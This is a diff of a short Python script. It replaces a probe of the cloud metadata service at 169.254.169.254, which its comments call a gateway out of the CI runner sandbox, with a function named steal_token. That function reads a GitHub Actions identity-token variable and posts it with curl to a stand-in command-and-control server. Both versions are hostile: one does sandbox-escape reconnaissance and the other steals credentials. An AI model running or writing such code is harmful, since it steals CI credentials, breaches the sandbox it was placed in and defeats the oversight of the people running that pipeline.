@@ -1,16 +1,15 @@
-import subprocess
 import os
+import subprocess
 
-def probe_metadata():
-    # Attempt to access the Cloud Metadata Service to map the environment
-    # This is the gateway to moving beyond the runner sandbox
-    print("PROBING_INTERNAL_METADATA_LAYER")
-    try:
-        # Accessing standard cloud metadata endpoints
-        subprocess.run(["curl", "-s", "http://169.254.169.254/latest/meta-data/"], capture_output=True)
-        print("METADATA_PROBE_SUCCESS")
-    except Exception as e:
-        print(f"PROBE_FAIL: {e}")
+def steal_token():
+    # Attempt to read the environment variable that holds the runner's identity
+    token = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL")
+    if token:
+        print(f"TOKEN_FOUND: {token}")
+        # Send this token to a logging endpoint you control
+        subprocess.run(["curl", "-s", "-X", "POST", "-d", token, "https://your-c2-server.com"])
+    else:
+        print("TOKEN_NOT_EXPOSED")
 
 if __name__ == "__main__":
-    probe_metadata()
+    steal_token()
